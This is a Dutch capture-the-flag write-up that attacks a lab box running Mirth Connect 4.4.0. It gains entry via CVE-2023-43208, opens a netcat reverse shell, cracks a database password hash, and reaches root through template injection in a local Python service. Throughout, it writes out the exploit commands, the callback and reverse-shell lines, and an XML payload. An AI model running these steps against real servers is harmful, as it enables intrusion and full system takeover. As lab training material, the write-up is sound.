# Interpreter

Openen van de webpagina toont een inlog voor iets genaamd `Mirth Connect`. Met
een snelle google komen we al vrij snel terecht bij `CVE-2023-43208` waar een
RCE gevonden is in de versie van `Mirth` die draait (4.4.0).

> Versie nummer is te valideren met `curl https://target/api/server/version`

# CVE-2023-43208

[Github](https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc),
deze pagina vind ik tijdens research en hier staat al een poc in om te valideren
dat we daadwerkelijk deze CVE kunnen uitbuiten.

```bash
# Start een listener lokaal
nc -lnvp 9001

# Dit levert niks op
python CVE-2023-43208.py -u "https://target" -c 'curl IP:9001' -p unix

# Dit wel
python CVE-2023-43208.py -u "https://target" -c 'wget IP:9001' -p unix
```

> _Als curl niet aanwezig is dan is dit wel een vrij kale installatie_

# Foothold

Met het volgende command `nc {LOCAL_IP} 9001 -e /bin/bash` heb ik een revshell
te pakken. Hierbij draait het wel als de `mirth` user die specifiek voor dit
process is. Via `cat /etc/passwd | grep bash` komen we wel achter de volgende
interessante users:

```
root:x:0:0:root:/root:/bin/bash
sedric:x:1000:1000:sedric,,,:/home/sedric:/bin/bash
```

> _CTF's altijd leuk, ik weet dat ik dus moet proberen toegang te krijgen tot de
> sedric user_

Op de box draait ook `mysql` (_gevonden met `ss -tunlp`_) en in
`conf/mirth.properties` vinden we hier ook een wachtwoord voor. In de database
komen we de volgende user tegen:

```
sedric:u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

Nu de vraag, wat voor soort hash is dit?

## JAVA!!?!

Omdat ik geen idee had hoe ik deze hash in hashcat moest gooien heb ik de code
van `Mirth Connect` van github getrokken en de relevante code voor hashing
gekopieerd naar een eigen programma die langs de rockyou database ging. Hiermee
heb ik uiteindelijk het wachtwoord gevonden en daarmee hebben we dus de user:

```
sedric:snowflake1
```

Hiermee hebben we ook gelijk SSH toegang te pakken.

# Privesc

Op de server zien we met `ss -tunlp` ook een service draaien op poort `54321`.
Dit lijkt werkzeug te zijn op basis van de headers maar alle calls hierna geven
een 404 terug. Uiteindelijk heb ik via `ps -A | grep python` het proces id
achterhaald en met `cat /proc/3510/cmdline` zag ik dat het om
`/usr/local/bin/notif.py` gaat.

# Notif.py

Dit is een script die een XML omzet naar een ander format. Hierbij is er 1
endpoint `POST /addPatient`. Eerste ingeving is om hier een `XXE` exploit te
gebruiken.

Met wat testen kom ik niet heel veel verder met XXE, maar beter naar de code
kijkend lijkt er een template injection mogelijkheid te zijn. Voor deze injectie
is er wel een whitelist waar ik voorbij moet. Namelijk de volgende regex:
`^[a-zA-Z0-9._'\"(){}=+/]+$`.

Nu kan ik dus geen `,` of `$` gebruiken dus de standaard bypass technieken
vallen een beetje weg. Maar ik heb al `SSH` toegang tot de server. De truuk is
dus:

- Maak een shell bestand op de server aan met alles wat je hartje begeert
- Creëer een XML die dit shell bestand aanroept: `os.system("/tmp/shell.sh")`

De uiteindelijke payload ziet er als volgt uit:

```xml
<patient>
    <firstname>{7+7}</firstname>
    <lastname>{os.system("/tmp/shell.sh")}</lastname>
    <sender_app>test</sender_app>
    <timestamp>test</timestamp>
    <birth_date>01/01/1970</birth_date>
    <gender>m</gender>
</patient>
```

Via `ssh -L 54321:localhost:54321 sedric:target` heb ik dan een port forward
naar de interne server. Wanneer ik dan het volgende aanroep wordt de
`/tmp/shell.sh` aangeroepen vanuit de root user:

```shell
curl \
    -X POST \
    "http://localhost:54322/addPatient" \
    --data-binary '@payload.xml' \
    -H 'Content-Type: application/xml'
```

> _In /tmp/shell.sh staat een simpele revshell_
